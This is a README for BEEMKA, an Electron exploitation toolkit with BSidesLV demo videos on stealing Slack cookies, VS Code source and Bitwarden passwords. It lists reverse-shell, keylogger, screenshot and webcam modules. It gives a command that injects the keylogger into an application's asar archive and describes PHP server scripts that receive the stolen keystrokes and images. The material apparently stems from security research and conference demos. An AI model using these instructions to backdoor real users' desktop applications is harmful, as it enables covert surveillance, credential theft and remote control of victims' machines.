# BEEMKA

## Electron Exploitation Toolkit

### BSidesLV Slack Cookie Egress Demo

[![Slack Cookie Egress](http://img.youtube.com/vi/hRX7kT2r7LA/0.jpg)](https://www.youtube.com/watch?v=hRX7kT2r7LA)

### BSidesLV VSCode Source Code Egress Demo

[![VSCode Source Code Egress](http://img.youtube.com/vi/pKWX3nelszQ/0.jpg)](https://www.youtube.com/watch?v=pKWX3nelszQ)

### Demo Videos (YouTube)

#### Bitwarden Password Egress

[![Bitwarden Password Egress](http://img.youtube.com/vi/qDTKYNGsyuI/0.jpg)](https://www.youtube.com/watch?v=qDTKYNGsyuI)

### Skype Reverse Shell (Linux)

[![Skype Reverse Shell](http://img.youtube.com/vi/FLA93oG5gZE/0.jpg)](https://www.youtube.com/watch?v=FLA93oG5gZE)

### Slack Desktop Screenshots

[![Slack Desktop Screenshots](http://img.youtube.com/vi/H-phownVcN4/0.jpg)](https://www.youtube.com/watch?v=H-phownVcN4)

### VS Code WebCamera

[![Slack Desktop Screenshots](http://img.youtube.com/vi/xvWXlUswAfo/0.jpg)](https://www.youtube.com/watch?v=xvWXlUswAfo)

### Requirements

- Python 3.5+
- jsmin

### Installation

```
pip3 install -r requirements.txt
```

### Modules

```
python3 beemka.py --list

Available modules

[ rshell_cmd ]          Windows Reverse Shell
[ rshell_linux ]        Linux Reverse Shell
[ screenshot ]          Screenshot Module
[ rshell_powershell ]   PowerShell Reverse Shell
[ keylogger ]           Keylogger Module
[ webcamera ]           WebCamera Module
```

Features:

```
usage: Beemka Electron Exploitation [-h] [-v] [-l] [-i] [-f ASAR_FILE]
                                    [-p ASAR_WORKING_PATH] [-o OUTPUT_FILE]
                                    [-m MODULE] [-u] [-z]

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -l, --list-modules    List all available modules.
  -i, --inject          Inject code into Electron.
  -f ASAR_FILE, --asar ASAR_FILE
                        Path to electron.asar file.
  -p ASAR_WORKING_PATH, --asar-working-path ASAR_WORKING_PATH
                        Temporary working path to use for extracting asar
                        archives.
  -o OUTPUT_FILE, --output OUTPUT_FILE
                        Path to the file that will be generated.
  -m MODULE, --module MODULE
                        Module to inject. Use --list-modules to list available
                        modules.
  -u, --unpack          Unpack asar file.
  -z, --pack            Pack asar file.
```

Injecting a module into an application:

```
python3 beemka.py --inject --module keylogger --asar "PATH_TO_ELECTRON.ASAR" --output "SAVE_AS_ASAR"
```

### Exfiltration helpers

Under the ./server directory there are the following files:

#### text.php
This file can be used to receive data sent by the keylogger module.

Before using it, make sure you update the "$storage" parameter at the beginning of the file.

#### image.php
This file can be used to receive data sent by the webcamera and screenshot modules.

Before using it, make sure you update the "$storage" parameter at the beginning of the file.

### Credits

[Leonardo Vieira](https://github.com/leovoel) for his asar.py class
